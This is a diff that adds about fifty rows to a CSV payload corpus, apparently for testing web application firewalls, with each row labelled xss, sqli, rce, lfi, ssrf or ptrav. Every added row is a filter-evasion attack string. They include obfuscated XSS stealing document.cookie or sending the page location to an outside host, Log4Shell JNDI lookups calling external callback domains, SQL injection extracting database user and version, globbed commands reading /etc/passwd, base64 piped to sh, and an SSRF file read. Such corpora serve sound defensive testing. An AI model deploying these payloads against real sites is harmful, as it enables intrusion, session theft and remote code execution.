@@ -352,3 +352,54 @@ https://waf-bypass.com/,? <a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a
 https://waf-bypass.com/,<svg onload=prompt%26%230000000040document.domain)>,xss
 https://waf-bypass.com/,"<svg onload=prompt%26%23?000000028;document.domain)>",xss
 https://waf-bypass.com/,../et*/pas**d,lfi
+https://waf-bypass.com/,<a href=ja%26Tab%3bvasc%26Tab%3bript:prompt`1`>pwn</a>,xss
+https://waf-bypass.com/,<details+/'on+/ontoggle=1^confirm(document.domain)+open//,xss
+https://waf-bypass.com/,<sVg/onfake=""x=y""oNload=;1^(co\u006efirm)``^1//,xss
+https://waf-bypass.com/,<img src=1 href=1 onerror=""javascript:alert('HEJAP ZAIRY AL-SHARIF')""></img>,xss
+https://waf-bypass.com/,""><sc<>ript><onxXxxXXxXXXxx=()%20autofoco%20onmouseover=alert(""HEJAP ZAIRY AL-SHARIF"")></scr<>ipt> ,xss
+https://waf-bypass.com/,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:},rce
+https://waf-bypass.com/,<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>,xss
+https://waf-bypass.com/,""><svg%20onload=alert%26%230000000040""mysanismine"")>,xss
+https://waf-bypass.com/,%00""><img src=x onerror=alert`1`//,xss
+https://waf-bypass.com/,<iframe+/ON+onload=%20alert(/str0d/)>,xss
+https://waf-bypass.com/,""<a href=""""/*"""">*/)});
+https://waf-bypass.com/,function+__MobileAppList(){alert(1)}//>"",xss
+https://waf-bypass.com/,""${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://xxx.dnslog.cn}
+https://waf-bypass.com/,${jndi${123%25ff:-}:ldap://xxx.dnslog.cn}"",rce
+https://waf-bypass.com/,<h1/%6f%6e/oNclicK=alert``>XSS,xss
+https://waf-bypass.com/,<svg/%6f%6e/oNloaD=alert``>,xss
+https://waf-bypass.com/,${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}},rce
+https://waf-bypass.com/,%27/**/%256fR/**/50%2521%253D22%253B%2523,sqli
+https://waf-bypass.com/,0%20/*!union*/%20/*!select*/%201,2,3,4,user(),6,7,version(),9,10,11,sqli
+https://waf-bypass.com/,<svg onpointerenter=jQuery.globalEval(""al""+""ert(documen""+""t.cooki""+""e)"");>,xss
+https://waf-bypass.com/,<svg onload=alert&#0000000040document.cookie)>,xss
+https://waf-bypass.com/,<img+src=x+on<!--ram-->error=ale<!--ram-->rt(1)>,xss
+https://waf-bypass.com/,<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>,xss
+https://waf-bypass.com/,""firstname"":""<img src ='"",""lastname"":""'onerror=print()>"",xss
+https://waf-bypass.com/,""><a/\test=""%26quot;x%26quot;""href='%01javascript:/*%b1*/;location.assign(""//hackerone.com/stealthy?x=""+location)'>Click,xss
+https://waf-bypass.com/,""><img src=1 onmouseleave=print()>,xss
+https://waf-bypass.com/,"" on<embed>click=""a=al<embed>ert,a(cookie),xss
+https://waf-bypass.com/,%27%09);%0d%0a%09%09[1].find(alert)//,xss
+https://waf-bypass.com/,<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme,xss
+https://waf-bypass.com/,test"",prompt%0A/*HelloWorld*/(document.domain),xss
+https://waf-bypass.com/,/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/),sqli
+https://waf-bypass.com/,ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6,xss
+https://waf-bypass.com/,<ifram%0de src=jav%0dascript:alert(document.cookie)>,xss
+https://waf-bypass.com/,-setTimeout`prompt\u0028document.domain\u0029`-',xss
+https://waf-bypass.com/,cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,ptrav
+https://waf-bypass.com/,;+$u+cat+/etc$u/passwd$u,rce
+https://waf-bypass.com/,;+$u+cat+/etc$u/passwd+\#,rce
+https://waf-bypass.com/,/???/??t+/???/??ss??,rce
+https://waf-bypass.com/,/?in/cat+/et?/passw?,rce
+https://waf-bypass.com/,“><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>,xss
+https://waf-bypass.com/,<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>,xss
+https://waf-bypass.com/,“><sVg/OnLuFy=”X=y”oNloaD=;1^confirm(1)>/“^1//,xss
+https://waf-bypass.com/,<x/onclick=globalThis&lsqb;’\u0070r\u006f’+’mpt’]&lt;)>clickme,xss
+https://waf-bypass.com/,\/><img src=x onerror=”a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)”>,xss
+https://waf-bypass.com/,-1′ and .0union+distinct+select+1+–+,sqli
+https://waf-bypass.com/,qaramany'%2buser_name(@@version)--,sqli
+https://waf-bypass.com/,1%27/** /%256FR/** /50%2521%253D22%253B%2523,sqli
+https://waf-bypass.com/,%2522%252B%254F%2552%252B%2531%2521%253D%2537%2523,sqli
+https://waf-bypass.com/,1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(‘{hex_query}’))),’>{brute_force}(.+)?@<‘,’i’),sqli
+https://waf-bypass.com/,printf dW5hbWUgLWE= | base64 -d | sh,rce
+https://waf-bypass.com/,target[.]com/download?url=[shortened link of http://ssrfip/download?url=file:///etc/passwd],ssrf
